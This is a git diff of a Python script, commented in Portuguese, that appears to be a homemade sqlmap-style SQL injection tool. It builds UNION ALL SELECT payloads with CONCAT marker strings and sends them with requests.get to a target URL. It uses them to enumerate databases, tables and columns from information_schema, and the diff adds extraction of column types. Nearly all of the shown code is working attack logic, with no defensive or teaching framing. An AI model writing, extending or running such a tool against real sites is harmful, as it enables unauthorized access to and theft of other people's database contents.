@@ -14,16 +14,17 @@ argv = argv.replace(" ,", ",").replace(", ", ",")
 argv = argv.split()
 
 #função que puxa as infos
-def sqli(pull_type: str, diretory: str, extra: str=""):
+def sqli(pull_type: str, diretory: str, extra: str="", column=False):
     infos = ['']
     new = []
     for i in range(n):
         algr = []
         for j in range(n):
-            algr.append(f"CONCAT(UPPER('x{i}tikten0x'), {pull_type}, UPPER('x0tikten{i}x'))")
+            algr.append(f"CONCAT(UPPER('x{i}tikten0x'), {pull_type}, ' ', column_type, UPPER('x0tikten{i}x'))")
         algr = ",".join(algr)
         for j in infos:
-            new.append(f"{pull_type} != '{j}'")
+            if j.split() != [] and column: new.append(f"{pull_type} != '{j.split()[0]}'")
+            else: new.append(f"{pull_type} != '{j}'")
         new = " AND ".join(new)
         r = requests.get(f"{argv[1]} union all select {algr} from {diretory} where {new} {extra} --")
         r = r.text
@@ -107,7 +108,7 @@ elif "--columns" in argv:
     db = pullt("--columns", "-D")
     table = pullt("--columns", "-T")
     pull_columns()
-    res = sqli("column_name", "information_schema.columns", f"and table_schema = '{db}' and table_name = '{table}'")
+    res = sqli("column_name", "information_schema.columns", f"and table_schema = '{db}' and table_name = '{table}'", column=True)
     print(res)
 
 elif "-C" in argv:
